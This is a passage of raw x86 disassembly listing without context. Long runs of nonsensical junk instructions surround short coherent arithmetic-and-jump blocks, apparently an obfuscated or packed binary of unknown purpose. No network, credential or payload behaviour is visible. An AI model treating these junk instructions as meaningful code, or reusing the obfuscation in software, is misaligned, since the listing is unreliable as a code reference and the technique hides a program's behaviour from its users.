  404231:	jb     0x40422a
  404233:	ret    0xdf35
  404236:	pop    ecx
  404237:	adc    al,0x29
  404239:	call   0x51f5:0xf0635872
  404240:	adc    BYTE PTR [edi+0x24f00036],dh
  404246:	cmp    al,0x7c
  404248:	mov    esi,0x33a85095
  40424d:	shl    BYTE PTR [ebx],1
  40424f:	clc    
  404250:	jmp    0x4043fa
  404255:	xchg   ebp,eax
  404256:	push   0xffffffb8
  404258:	int3   
  404259:	jns    0x404237
  40425b:	imul   eax,DWORD PTR gs:[ebp+eax*4+0x27],0x15
  404261:	fistp  WORD PTR [esi+0xd]
  404264:	push   edx
  404265:	in     eax,dx
  404266:	push   ss
  404267:	jle    0x4042e7
  404269:	mov    edi,DWORD PTR [edi+0x7e]
  40426c:	jle    0x4042e6
  40426e:	loop   0x4042de
  404270:	dec    eax
  404271:	cmp    bl,BYTE PTR [edx]
  404273:	mov    al,ds:0xe21df9b8
  404278:	or     BYTE PTR ds:0xf76abae4,bl
  40427e:	shr    BYTE PTR [edx-0x4d],0xa7
  404282:	jge    0x404297
  404284:	adc    BYTE PTR [ebx-0x32],0x39
  404288:	cmp    BYTE PTR [ebx+0x3e],0xbd
  40428c:	jo     0x404302
  40428e:	fld    TBYTE PTR [ebp-0x2d37bcf]
  404294:	mov    edx,0x1053b09a
  404299:	fwait
  40429a:	sub    dl,BYTE PTR ds:0x1c7a9878
  4042a0:	dec    esp
  4042a1:	mov    dl,BYTE PTR [edi-0x50a13306]
  4042a7:	adc    BYTE PTR [ebx-0xe],bh
  4042aa:	push   0x48d4e71d
  4042af:	add    al,0x4b
  4042b1:	pop    esi
  4042b2:	sub    eax,0x2540e528
  4042b7:	mov    esp,0xb3e1d90a
  4042bc:	push   0xcedb1ce9
  4042c1:	lds    esi,FWORD PTR [ecx+0x28]
  4042c4:	jno    0x4042ed
  4042c6:	in     al,0x3b
  4042c8:	jmp    0x404303
  4042ca:	inc    eax
  4042cb:	pusha  
  4042cc:	mov    edi,0xdfdfd643
  4042d1:	cs push cs
  4042d3:	mov    DWORD PTR [edi+0xb],edi
  4042d6:	lds    ecx,FWORD PTR [edx-0x79]
  4042d9:	xor    DWORD PTR [eax+edi*2],eax
  4042dc:	mov    dh,0xbc
  4042de:	mov    bh,BYTE PTR [esp+ecx*2]
  4042e1:	pop    edi
  4042e2:	sub    dl,BYTE PTR ds:[ebx-0x76]
  4042e6:	sub    DWORD PTR [ecx+edx*1],0x59aa0902
  4042ed:	sbb    al,0x7
  4042ef:	push   edi
  4042f0:	rol    BYTE PTR [ecx-0x1f],0x35
  4042f4:	xchg   DWORD PTR [esi+ebp*4+0x6149de35],ebp
  4042fb:	ret    
  4042fc:	call   0xd4352334
  404301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404302:	dec    esi
  404303:	jmp    0xfa8f:0x6ad73ba7
  40430a:	sub    ebp,edi
  40430c:	push   ecx
  40430d:	pop    ss
  40430e:	inc    edi
  40430f:	mov    dl,BYTE PTR [ebx-0x2a1c44dc]
  404315:	mov    ebp,0x6e7a5b3
  40431a:	cmp    esi,DWORD PTR [ecx]
  40431c:	xchg   edx,eax
  40431d:	imul   ecx,DWORD PTR [esi],0x853c4116
  404323:	pop    es
  404324:	xchg   BYTE PTR [edi+0x1],ch
  404327:	mov    ch,al
  404329:	mov    edx,0xcb2cab6
  40432e:	push   edi
  40432f:	xor    edx,DWORD PTR [edx]
  404331:	mov    fs,WORD PTR [eax-0x4a7e6779]
  404337:	mov    bh,0x8a
  404339:	or     eax,0x4b77538d
  40433e:	(bad)  
  40433f:	or     eax,0xc094779
  404344:	pop    es
  404345:	or     cl,dh
  404347:	mov    ds,WORD PTR [eax]
  404349:	lea    eax,[edx+0x55]
  40434c:	shl    DWORD PTR [esi],1
  40434e:	mov    ds:0xeede4f86,eax
  404353:	out    0x22,eax
  404355:	inc    esi
  404356:	(bad)  
  404357:	jb     0x40438a
  404359:	lock mov ebp,0xaac15e98
  40435f:	mov    esi,DWORD PTR [ecx]
  404361:	and    ch,bl
  404363:	xor    BYTE PTR [edx],0xd2
  404366:	scas   al,BYTE PTR es:[edi]
  404367:	jle    0x404379
  404369:	push   ds
  40436a:	mov    ecx,0xdbbe2a0b
  40436f:	std    
  404370:	sbb    eax,0x352d268c
  404375:	icebp  
  404376:	test   DWORD PTR [eax+0x59],ebx
  404379:	xchg   edi,eax
  40437a:	sbb    edi,esp
  40437c:	sub    ch,BYTE PTR [eax-0x2b6ac1a0]
  404382:	jne    0x4043e2
  404384:	call   0xf91:0x9d287369
  40438b:	loopne 0x4043c1
  40438d:	or     al,0x27
  40438f:	jl     0x404374
  404391:	mov    DWORD PTR [esi+esi*8],esp
  404394:	jl     0x40431e
  404396:	shl    DWORD PTR [ebx+0x58],cl
  404399:	xchg   edi,eax
  40439a:	xor    DWORD PTR [edx+0x4e],edi
  40439d:	into   
  40439e:	mov    ds:0x33d79759,al
  4043a3:	(bad)  
  4043a5:	sti    
  4043a6:	loope  0x40434f
  4043a8:	xchg   BYTE PTR [ebp-0x43],dh
  4043ab:	jp     0x40434a
  4043ad:	cmc    
  4043ae:	push   esi
  4043af:	std    
  4043b0:	fild   QWORD PTR [ecx-0x5a]
  4043b3:	cli    
  4043b4:	push   eax
  4043b5:	call   0xcdf841f9
  4043ba:	std    
  4043bb:	mov    ebx,0x1fc6584a
  4043c0:	retf   
  4043c1:	(bad)  
  4043c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043c3:	cdq    
  4043c4:	mov    ?,WORD PTR [esi+0x47]
  4043c7:	add    ah,BYTE PTR [edx]
  4043c9:	or     cl,BYTE PTR [esi-0x41237585]
  4043cf:	or     esp,DWORD PTR [eax-0x112bbcaa]
  4043d5:	xor    eax,0xb876bac5
  4043da:	in     al,0xaf
  4043dc:	out    0x91,al
  4043de:	shl    ebp,0x62
  4043e1:	pushf  
  4043e2:	dec    eax
  4043e3:	mov    dh,0xc9
  4043e5:	fstp   DWORD PTR [eax+0x23ae417e]
  4043eb:	lods   eax,DWORD PTR ds:[esi]
  4043ec:	xchg   ebp,eax
  4043ed:	jmp    0x4043fa
  4043ef:	es scas eax,DWORD PTR es:[edi]
  4043f1:	std    
  4043f2:	cmp    dh,ah
  4043f4:	xor    al,0x3c
  4043f6:	pop    edi
  4043f7:	push   ds
  4043f8:	inc    esi
  4043f9:	adc    al,0x3
  4043fb:	stc    
  4043fc:	add    edx,ecx
  4043fe:	imul   edx,edi
  404401:	mov    edi,DWORD PTR [ebp-0x8]
  404404:	mov    ebx,DWORD PTR [ebp-0x10]
  404407:	sub    ebx,edi
  404409:	cmp    ebx,edx
  40440b:	ja     0x404419
  404411:	mov    edx,DWORD PTR [ebp-0x30]
  404414:	jmp    0x404613
  404419:	mov    edx,DWORD PTR [ebp-0x38]
  40441c:	mov    edi,DWORD PTR [ebp-0x4]
  40441f:	xor    edx,eax
  404421:	xor    edi,eax
  404423:	add    edi,ecx
  404425:	add    edx,ecx
  404427:	imul   edx,edi
  40442a:	mov    edi,DWORD PTR [ebp-0x8]
  40442d:	mov    ebx,DWORD PTR [ebp-0x10]
  404430:	sub    ebx,edi
  404432:	cmp    ebx,edx
  404434:	ja     0x4045ec
  40443a:	jmp    0x4045e4
  40443f:	hlt    
  404440:	mov    ah,0xbf
  404442:	add    bh,BYTE PTR [edi+0x42444505]
  404448:	pop    ecx
  404449:	mov    ds:0x7875c0df,al
  40444e:	pop    ds
  40444f:	jp     0x404468
  404451:	jle    0x4044d1
  404453:	mov    edi,DWORD PTR [edi+0x7e]
  404456:	jle    0x40447a
  404458:	mov    edi,0x97945349
  40445d:	mov    ds:0x5833e436,al
  404462:	cli    
  404463:	aad    0xa
  404465:	adc    DWORD PTR [esi-0x13],ebp
  404468:	pop    ebx
  404469:	cmp    ah,BYTE PTR [ecx+0x14]
  40446c:	(bad)  
  40446d:	dec    ebp
  40446e:	sub    al,0xc
  404470:	pusha  
  404471:	push   ss
  404472:	rcl    BYTE PTR ss:[edi],0x14
  404476:	pushf  
  404477:	cdq    
  404478:	repnz icebp 
  40447a:	push   cs
  40447b:	dec    esi
  40447c:	fild   DWORD PTR [eax-0x2b]
  40447f:	push   0xffffffa2
  404481:	mov    bl,0xd
  404483:	enter  0x14d3,0xa3
  404487:	sar    BYTE PTR [edi+0x7a376f98],1
  40448d:	mov    eax,0xddd3510e
  404492:	push   edi
  404493:	jnp    0x4044bb
  404495:	mov    WORD PTR [ebx+0x586cf4c7],gs
  40449b:	pop    ebx
  40449c:	imul   edi,DWORD PTR [edx-0x396c5040],0xaa772538
  4044a6:	push   ds
  4044a7:	jecxz  0x404455
  4044a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044aa:	ret    
  4044ab:	inc    esp
  4044ac:	dec    ecx
  4044ad:	loopne 0x404510
  4044af:	pop    esp
  4044b0:	pop    edx
  4044b1:	mov    edx,0x8d0d9359
  4044b6:	xchg   esp,eax
  4044b7:	sub    DWORD PTR [ebx+0x28f2cf32],ebx
  4044bd:	sbb    al,0x5
  4044bf:	loop   0x404446
  4044c1:	les    edx,FWORD PTR [ecx]
  4044c3:	push   0xdcc19171
  4044c8:	mov    edx,0xae8421f
  4044cd:	and    DWORD PTR [ebx],0x8c1ab35f
  4044d3:	dec    bx
  4044d5:	cmp    eax,0xeced0027
  4044da:	enter  0xd147,0xff
  4044de:	outs   dx,DWORD PTR ds:[esi]
  4044df:	loope  0x404521
  4044e1:	push   ebp
  4044e2:	mov    cs,esi
  4044e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044e5:	jno    0x4044e1
  4044e7:	or     ah,BYTE PTR [esi+0x305aa140]
  4044ed:	cmp    cl,BYTE PTR [esi+0x13cf3a27]
  4044f3:	mov    bl,BYTE PTR [edi*4+0x4e72d162]
  4044fa:	jbe    0x4044b8
  4044fc:	xor    eax,0xee4d4537
  404501:	inc    edi
  404502:	es scas al,BYTE PTR es:[edi]
  404504:	jno    0x404509
  404506:	pop    es
  404507:	bound  ebp,QWORD PTR [edx+ebp*4+0x25]
  40450b:	mov    ebx,0xdee72a95
  404510:	je     0x40455b
  404512:	loop   0x404582
  404514:	(bad)  
  404515:	(bad)  
  404516:	adc    dl,BYTE PTR [edx]
  404518:	lods   al,BYTE PTR ds:[esi]
  404519:	mov    DWORD PTR [ecx+0x0],esi
  40451c:	push   cs
  40451d:	popa   
  40451e:	inc    esi
  40451f:	pop    esp
  404520:	es pop ebp
  404522:	add    eax,0x3361a3e8
  404527:	loop   0x40457e
  404529:	mov    ds:0x97de832d,al
  40452e:	pop    edi
  40452f:	outs   dx,DWORD PTR ds:[esi]
  404530:	ja     0x4044c0
  404532:	jp     0x4044ed
  404534:	push   0x176e8519
  404539:	std    
  40453a:	das    
  40453b:	mov    edx,0xf35741ec
  404540:	jb     0x4044e5
  404542:	out    dx,al
  404543:	(bad)  
  404544:	cld    
  404545:	push   ebx
  404546:	xchg   esi,eax
  404547:	dec    ebx
  404548:	mov    esp,0x344c58a4
  40454d:	or     DWORD PTR [eax-0xfb4d994],edx
  404553:	xor    eax,0xc80a1a37
  404558:	sbb    ebx,DWORD PTR [eax]
  40455a:	sbb    eax,ebp
  40455c:	xchg   ebp,eax
  40455d:	mov    esp,0xcb6a390e
  404563:	xchg   esi,edx
  404565:	sbb    eax,0x185ffd53
  40456a:	test   eax,0x44451118
  40456f:	imul   esp,DWORD PTR [ecx],0x6df01496
  404575:	out    dx,al
  404576:	jl     0x404557
  404578:	xlat   BYTE PTR ds:[ebx]
  404579:	add    al,0xb1
  40457b:	push   0xffffffb9
  40457d:	xor    al,0x40
  40457f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404580:	jbe    0x4045de
  404582:	jae    0x40454f
  404584:	rcl    BYTE PTR ds:0x371d8537,0xc3
  40458b:	nop
  40458c:	fimul  WORD PTR [ebx-0x6c4cd0c9]
  404592:	sbb    BYTE PTR [ecx],bl
  404594:	ins    BYTE PTR es:[edi],dx
  404595:	inc    edx
  404596:	in     eax,0xfa
  404598:	(bad)  
  404599:	xor    DWORD PTR [edi+eax*4-0x40],eax
  40459d:	rcl    bl,0x68
  4045a0:	iret   
  4045a1:	push   eax
  4045a2:	adc    BYTE PTR [edx-0x76],bh
  4045a5:	or     DWORD PTR [ebx],0x15
  4045a8:	push   0x79
  4045aa:	cli    
  4045ab:	or     eax,0x8a735f42
  4045b0:	aam    0x43
  4045b2:	lock pop esi
  4045b4:	aam    0x69
  4045b6:	jge    0x40455a
  4045b8:	or     DWORD PTR [ebx+0x7],esp
  4045bb:	push   ebp
  4045bc:	sbb    al,0xe1
  4045be:	shl    dl,0xe2
  4045c1:	sub    al,0xd4
  4045c3:	clc    
  4045c4:	cmp    eax,DWORD PTR [ebx-0x66]
  4045c7:	inc    esi
  4045c8:	call   0x36b8:0x87ac77d6
  4045cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045d0:	sbb    al,BYTE PTR [eax+eax*4]
  4045d3:	(bad)  
  4045d4:	push   esi
  4045d5:	popf   
  4045d6:	fld    QWORD PTR [edx+edi*1]
  4045d9:	xchg   edi,eax
  4045da:	ins    BYTE PTR es:[edi],dx
  4045db:	and    al,0xb1
  4045dd:	(bad)  
  4045de:	jmp    0x8b2a:0x8c470598
  4045e5:	push   ebp
  4045e6:	int3   
  4045e7:	jmp    0x404613
  4045ec:	mov    edx,DWORD PTR [ebp-0x3c]
  4045ef:	mov    edi,DWORD PTR [ebp-0x4]
  4045f2:	xor    edx,eax
  4045f4:	xor    edi,eax
  4045f6:	add    edx,ecx
  4045f8:	add    edi,ecx
  4045fa:	imul   edx,edi
  4045fd:	mov    edi,DWORD PTR [ebp-0x8]
  404600:	mov    ebx,DWORD PTR [ebp-0x10]
  404603:	sub    ebx,edi
  404605:	cmp    ebx,edx
  404607:	mov    edx,DWORD PTR [ebp-0x38]
  40460a:	jbe    0x404613
  404610:	mov    edx,DWORD PTR [ebp-0x3c]
  404613:	mov    edi,DWORD PTR [ebp-0x4]
  404616:	xor    edi,eax
  404618:	xor    edx,eax
  40461a:	add    edi,ecx
  40461c:	add    edx,ecx
  40461e:	imul   edx,edi
  404621:	mov    DWORD PTR [ebp+0xc],edx
  404624:	mov    edx,DWORD PTR [ebp+0xc]
  404627:	mov    DWORD PTR [ebp-0x24],edx
  40462a:	mov    edx,DWORD PTR [ebp-0x8]
  40462d:	add    edx,DWORD PTR [ebp-0x40]
  404630:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  404637:	mov    DWORD PTR [ebp-0x1c],edx
  40463a:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404641:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404648:	mov    edx,DWORD PTR [ebp-0x18]
  40464b:	xor    edx,eax
  40464d:	add    edx,ecx
  40464f:	jmp    0x404d64
  404654:	mov    edx,DWORD PTR [ebp-0x18]
  404657:	jmp    0x404801
  40465c:	dec    esi
  40465d:	(bad)  
  40465e:	(bad)  
  40465f:	push   edi
  404660:	dec    esi
  404661:	push   edi
  404662:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404664:	xor    BYTE PTR [edx-0x60ef40d0],al
  40466a:	int3   
  40466b:	sub    edi,esi
  40466d:	sub    DWORD PTR [esi+0x7e],edi
  404670:	mov    edi,DWORD PTR [edi+0x7e]
  404673:	jle    0x40464f
  404675:	adc    DWORD PTR cs:[eax-0x2327cc5b],ecx
  40467c:	add    esp,edx
  40467e:	fldcw  WORD PTR [ebp+0x4a]
  404681:	test   BYTE PTR [edx-0x7d7c1c3e],bl
  404687:	bound  ebp,QWORD PTR [eax]
  404689:	nop
  40468a:	imul   edx,DWORD PTR ds:0xf01099d0,0x49
  404691:	sub    al,0x88
  404693:	test   al,0x47
  404695:	inc    ebx
  404696:	xchg   esi,eax
  404697:	xchg   BYTE PTR [ecx-0x898cdb9],cl
  40469d:	aas    
  40469e:	xchg   BYTE PTR fs:[edx+0x4d],bh
  4046a2:	xlat   BYTE PTR ds:[ebx]
  4046a3:	jbe    0x4046f2
  4046a5:	pop    ebp
  4046a6:	jmp    0xb96f:0xfb272333
  4046ad:	mov    eax,ds:0x9a940507
  4046b2:	ins    DWORD PTR es:[edi],dx
  4046b3:	xchg   DWORD PTR [eax+0x63a95d96],ecx
  4046b9:	out    0xf6,al
  4046bb:	out    dx,eax
  4046bc:	mov    eax,ds:0x2bfe5086
  4046c1:	mov    esi,0xda69df19
  4046c6:	adc    DWORD PTR [ecx],edx
  4046c8:	fsubr  st,st(4)
  4046ca:	sub    al,0x37
  4046cc:	sub    al,0xb8
  4046ce:	retf   
  4046cf:	(bad)  
  4046d0:	retf   
  4046d1:	in     al,dx
  4046d2:	xchg   ebp,eax
  4046d3:	test   DWORD PTR [ebx+0x2bca912d],ecx
  4046d9:	lock dec esi
  4046db:	shr    BYTE PTR [ecx],1
  4046dd:	imul   bl
  4046df:	push   0xa11d86cf
  4046e4:	rcr    eax,1
  4046e6:	(bad)  
  4046e7:	test   BYTE PTR [ecx-0x32],bl
  4046ea:	push   es
  4046eb:	test   DWORD PTR [esi+0x136946b2],edx
  4046f1:	add    ebx,DWORD PTR [ecx]
  4046f3:	adc    eax,0x5464c407
  4046f8:	test   al,0xff
  4046fa:	fmul   st(2),st
  4046fc:	imul   edx,DWORD PTR [edi-0x6240017c],0x50fe224b
  404706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404707:	idiv   dh
  404709:	enter  0xcb1e,0xef
  40470d:	call   0xb74bf7b6
  404712:	cwd    
  404714:	lds    ecx,FWORD PTR [esi]
  404716:	or     al,0x42
  404718:	jns    0x404718
  40471a:	pop    edx
  40471b:	(bad)  
  40471d:	in     eax,0x33
  40471f:	int    0x4
  404721:	xchg   ebx,eax
  404722:	in     al,0x75
  404724:	pop    ebx
  404725:	repz push es
  404727:	mov    edi,0x6141f58b
  40472c:	cmp    al,0x49
  40472e:	xchg   esp,eax
  40472f:	jb     0x404775
  404731:	dec    DWORD PTR [edx+edi*2+0x43017d86]
  404738:	add    DWORD PTR [esi-0x1],0xffffffba
  40473c:	dec    ebx
  40473d:	(bad)  
  40473f:	mov    esp,0xb2462a85
  404744:	push   esi
  404745:	lds    edx,FWORD PTR [esi+0x16fc5d9d]
  40474b:	sub    eax,0xf146086
  404750:	ins    BYTE PTR es:[edi],dx
  404751:	sbb    DWORD PTR [ebx-0xc97542f],ebp
  404757:	data16 arpl WORD PTR [ecx-0x74],sp
  40475b:	aam    0xf6
  40475d:	inc    esp
  40475e:	mov    dh,0x4d
  404760:	int3   
  404761:	(bad)  
  404762:	mov    fs,WORD PTR [eax]
  404764:	pusha  
  404765:	je     0x4047a5
  404767:	push   es
  404768:	or     DWORD PTR [ecx-0x5f],esi
  40476b:	jp     0x4047bd
  40476d:	push   ecx
  40476e:	test   eax,0x52c8c431
  404773:	fidiv  WORD PTR [ecx+0x95fe337]
  404779:	lds    ecx,FWORD PTR [ebx+0x56]
  40477c:	inc    ebx
  40477d:	pop    ebp
  40477e:	sar    DWORD PTR [esi+0x19],1
  404781:	xchg   ch,dl
  404783:	fnstsw WORD PTR [eax-0x68]
  404786:	loope  0x4047eb
  404788:	mov    es,esp
  40478a:	jl     0x404757
  40478c:	jb     0x4047b1
  40478e:	xchg   DWORD PTR [ecx+0x3e],ecx
  404791:	push   0xe83f909c
  404796:	jle    0x404755
  404798:	mov    eax,0xb6c9514a
  40479d:	lock xor ebx,eax
  4047a0:	(bad)  
  4047a1:	lds    edi,FWORD PTR [ebp-0x4bf010ce]
  4047a7:	push   ss
  4047a8:	add    ch,BYTE PTR [esi+ecx*4+0x1f]
  4047ac:	xor    DWORD PTR [ecx],esp
  4047ae:	test   al,0x3b
  4047b0:	jo     0x40475d
  4047b2:	leave  
  4047b3:	pop    eax
  4047b4:	sti    
  4047b5:	jmp    0x8e48645c
  4047ba:	pop    ecx
  4047bb:	mov    eax,0x106f2475
  4047c0:	sub    eax,0x95c7c2c7
  4047c5:	and    BYTE PTR [eax+0x28],0x21
  4047c9:	fst    st(7)
  4047cb:	fstp   QWORD PTR [esi+0x12]
  4047ce:	cli    
  4047cf:	adc    BYTE PTR [ebx],dl
  4047d1:	fs out 0x91,al
  4047d4:	mov    esi,ds
  4047d6:	js     0x40479a
  4047d8:	mov    dl,0x81
  4047da:	sub    BYTE PTR [eax-0x59],0x27
  4047de:	stos   BYTE PTR es:[edi],al
  4047df:	xlat   BYTE PTR ds:[ebx]
  4047e0:	mov    al,ds:0x39f1c143
  4047e5:	mov    al,0xe0
  4047e7:	add    bl,BYTE PTR [ecx-0x54]
  4047ea:	or     eax,0x65868749
  4047ef:	fist   WORD PTR [ebp-0x55c19f0e]
  4047f5:	repnz cwde 
  4047f7:	mov    bl,BYTE PTR [ebx-0x2]
  4047fa:	mov    bl,0x3c
  4047fc:	xor    BYTE PTR [ecx],cl
  4047fe:	mov    ebx,ebx
  404800:	mov    dh,BYTE PTR [ebx]
  404802:	rol    BYTE PTR [ebx],1
  404804:	push   ebp
  404805:	in     al,dx
  404806:	mov    edi,DWORD PTR [ebp-0x1c]
  404809:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404810:	mov    BYTE PTR [ebp+0xf],dl
  404813:	mov    edx,DWORD PTR [ebp-0xc]
  404816:	jmp    0x4049c0
  40481b:	and    BYTE PTR [esi+0x5a2a321e],0x62
  404822:	add    WORD PTR [edx+0x204f0ba],0x10
  40482a:	scas   al,BYTE PTR es:[edi]
  40482b:	add    al,0x2b
  40482d:	jle    0x4048ad
  40482f:	mov    edi,DWORD PTR [edi+0x7e]
  404832:	jle    0x4047e8
  404834:	sbb    al,0xb
  404836:	imul   ebp,esp,0x4d618a70
  40483c:	popf   
  40483d:	mov    gs,WORD PTR [eax]
  40483f:	mov    bl,0xe7
  404841:	scas   eax,DWORD PTR es:[edi]
  404842:	outs   dx,WORD PTR ds:[esi]
  404844:	fdiv   DWORD PTR gs:[edi-0xddd8c91]
  40484b:	and    al,0xc2
  40484d:	fwait
  40484e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40484f:	ror    DWORD PTR [edx+0x44d515f8],1
  404855:	mov    ah,0xc4
  404857:	xor    al,0xa8
  404859:	test   DWORD PTR [esi-0x4cac6d81],0xeb7e8888
  404863:	and    al,0x56
  404865:	sub    esi,DWORD PTR [ebp+0x301220e6]
  40486b:	iret   
  40486c:	dec    esp
  40486d:	sub    al,0x32
  40486f:	mov    ch,0x7e
  404871:	or     al,0x5a
  404873:	jne    0x40489c
  404875:	mul    BYTE PTR [ecx-0x2b70e04e]
  40487b:	sbb    eax,DWORD PTR [ebp+0x79]
  40487e:	rol    dl,cl
  404880:	inc    ecx
  404881:	mov    dh,0xea
  404883:	loop   0x40484e
  404885:	sub    bh,0x15
  404888:	jecxz  0x4048c5
  40488a:	leave  
  40488b:	lods   al,BYTE PTR ds:[esi]
  40488c:	repnz sbb BYTE PTR [ecx-0x5d],bl
  404890:	test   DWORD PTR [ecx+0x172ec433],ebx
  404896:	in     al,dx
  404897:	xchg   esp,eax
  404898:	push   es
  404899:	or     edi,edx
  40489b:	cwde   
  40489c:	adc    eax,0x6824f257
  4048a1:	jno    0x404917
  4048a3:	add    eax,0x41c5a83c
  4048a8:	sbb    esp,esi
  4048aa:	inc    ecx
  4048ab:	call   FWORD PTR [ebp-0x67]
  4048ae:	popf   
  4048af:	or     edx,ebp
  4048b1:	popf   
  4048b2:	adc    bl,BYTE PTR [esi]
  4048b4:	mov    al,ds:0x500a0dc6
  4048b9:	mov    bl,0xf5
  4048bb:	not    DWORD PTR [ebp-0x2c60db47]
  4048c1:	stos   BYTE PTR es:[edi],al
  4048c2:	out    dx,eax
  4048c3:	push   es
  4048c4:	sub    ebx,DWORD PTR [edx-0x76c17ad1]
  4048ca:	inc    edi
  4048cb:	js     0x404862
  4048cd:	sbb    eax,0x596f334
  4048d2:	pmulhw mm3,mm6
  4048d5:	mov    edi,0xb3cd673f
  4048da:	leave  
  4048db:	inc    eax
  4048dc:	ds ins BYTE PTR es:[edi],dx
  4048de:	adc    bh,cl
  4048e0:	inc    ebp
  4048e1:	sti    
  4048e2:	rcl    dh,0xa8
  4048e5:	loope  0x4048f8
  4048e7:	loope  0x4048c6
  4048e9:	shr    DWORD PTR [ebp-0x7f],1
  4048ec:	lods   eax,DWORD PTR ds:[esi]
  4048ed:	xor    al,0xe6
  4048ef:	je     0x404929
  4048f1:	cmp    al,0x45
  4048f3:	add    BYTE PTR [eax],al
  4048f5:	shrd   DWORD PTR [ecx-0x5a],edx,0xa1
  4048fa:	in     al,0xe6
  4048fc:	adc    BYTE PTR [edx+0x72c4f800],bh
  404902:	sub    ecx,DWORD PTR ds:0xd933dbc5
  404908:	sub    dh,BYTE PTR [esi-0x3a]
  40490b:	adc    al,0xd
  40490d:	imul   ecx,DWORD PTR cs:[ecx],0x7e
  404911:	sub    al,0xf8
  404913:	jl     0x4048f8
  404915:	aam    0x9a
  404917:	dec    esi
  404918:	push   esp
  404919:	data16 add BYTE PTR [esi-0x4c],dl
  40491d:	sbb    DWORD PTR [ebx+0x4f],esp
  404920:	imul   ecx,DWORD PTR [edi+0x44],0xe9cc898
  404927:	pop    ebx
  404928:	ror    DWORD PTR [eax],1
  40492a:	out    dx,eax
  40492b:	add    BYTE PTR [edi],al
  40492d:	leave  
  40492e:	or     ch,cl
  404930:	push   edx
  404931:	sbb    al,0x21
  404933:	jmp    0x1242ec87
  404938:	pop    ebp
  404939:	push   ds
  40493a:	mov    bl,0x7b
  40493c:	nop
  40493d:	fistp  QWORD PTR [ecx]
  40493f:	popa   
  404940:	pusha  
  404941:	jae    0x404915
  404943:	cmp    dl,BYTE PTR [ebx+edi*4+0x2]
  404947:	(bad)  
  404948:	cmp    BYTE PTR [eax+0x11],bl
  40494b:	addr16 dec ch
  40494e:	je     0x404946
  404950:	rol    DWORD PTR [eax-0x42055360],cl
  404956:	arpl   WORD PTR [ecx],cx
  404958:	imul   edx,DWORD PTR [edx+0x2e],0x1f242f79
  40495f:	repnz and eax,0xb87af021
  404965:	test   al,0x6a
  404967:	(bad)  
  404968:	fs add esi,ebx
  40496b:	sar    BYTE PTR [edx-0x4ee9b845],0x72
  404972:	cmp    al,dl
  404974:	jle    0x40499e
  404976:	xchg   DWORD PTR [edi-0x42e59008],edi
  40497c:	js     0x404901
  40497e:	addr16 cdq 
  404980:	cs jo  0x4049c9
  404983:	adc    eax,0x9f0f4476
  404988:	out    dx,al
  404989:	fs inc ebp
  40498b:	iret   
  40498c:	call   0x426b:0x101b09ac
  404993:	aam    0x2d
  404995:	shl    eax,0x38
  404998:	ss push edi
  40499a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40499b:	iret   
  40499c:	imul   esp,ebp,0x2b7fa68b
  4049a2:	lds    edx,FWORD PTR [edi-0x37fb78b4]
  4049a8:	mov    esi,0x15b6a6f5
  4049ad:	cmp    DWORD PTR [esi+eiz*8+0x53],ebp
  4049b1:	shl    DWORD PTR [ebp-0x42],cl
  4049b4:	pop    esp
  4049b5:	es jp  0x4049c7
  4049b8:	outs   dx,BYTE PTR ds:[esi]
  4049b9:	xor    al,0x94
  4049bb:	clc    
  4049bc:	xchg   edx,eax
  4049bd:	ror    BYTE PTR [ebp+0x3d0337d],cl
  4049c3:	push   ebp
  4049c4:	in     al,dx
  4049c5:	jmp    0x404b6f
  4049ca:	test   BYTE PTR [ebp-0x13],cl
  4049cd:	xor    edi,ebp
  4049cf:	push   ebx
  4049d0:	mov    esp,0xd1280b5d
  4049d5:	xor    eax,eax
  4049d7:	bound  ebx,QWORD PTR [esi+ebx*8+0x7e7e2c91]
  4049de:	mov    edi,DWORD PTR [edi+0x7e]
  4049e1:	jle    0x4049f9
  4049e3:	lods   eax,DWORD PTR ds:[esi]
  4049e4:	test   DWORD PTR ds:0xbbcf369d,esi
  4049ea:	jno    0x40499e
  4049ec:	or     BYTE PTR [esi-0x43],al
  4049ef:	pop    esp
  4049f0:	and    dh,cl
  4049f2:	pop    eax
  4049f3:	mov    bh,0x58
  4049f5:	retf   0x2dd2
  4049f8:	in     al,dx
  4049f9:	sub    BYTE PTR [ecx-0x45745eee],bh
  4049ff:	xchg   DWORD PTR [edx+eax*8],ecx
  404a02:	(bad)  
  404a03:	cli    
  404a04:	aaa    
  404a05:	xchg   esi,eax
  404a06:	out    0x90,al
  404a08:	(bad)  
  404a09:	add    ah,BYTE PTR [ecx+0x5]
  404a0c:	aad    0xd4
  404a0e:	or     dl,BYTE PTR [esi+0x67]
  404a11:	xor    eax,esp
  404a13:	and    BYTE PTR [edi-0x7e5d873d],bl
  404a19:	sbb    esi,DWORD PTR ds:0x2e621cae
  404a1f:	mov    eax,0xccf8e15f
  404a24:	aas    
  404a25:	test   al,0xb1
  404a27:	xlat   BYTE PTR ds:[ebx]
  404a28:	fstp   TBYTE PTR [edi]
  404a2a:	dec    edi
  404a2b:	cmp    al,0xe8
  404a2d:	xchg   ebx,eax
  404a2e:	cmp    eax,0xcf15fbc5
  404a33:	ins    BYTE PTR es:[edi],dx
  404a34:	je     0x404a43
  404a36:	mul    dl
  404a38:	es into 
  404a3a:	shl    esi,0xcb
  404a3d:	jmp    0x404aaf
  404a3f:	ret    
  404a40:	pop    es
  404a41:	push   cs
  404a42:	inc    ecx
  404a43:	xor    DWORD PTR [edi+0x43],0x407c0a20
  404a4a:	idiv   bl
  404a4c:	push   edi
  404a4d:	adc    ecx,DWORD PTR [ecx]
  404a4f:	mov    eax,0x59c30f1e
  404a54:	js     0x404a6b
  404a56:	sti    
  404a57:	push   edx
  404a58:	call   0xc92b:0xb6a706af
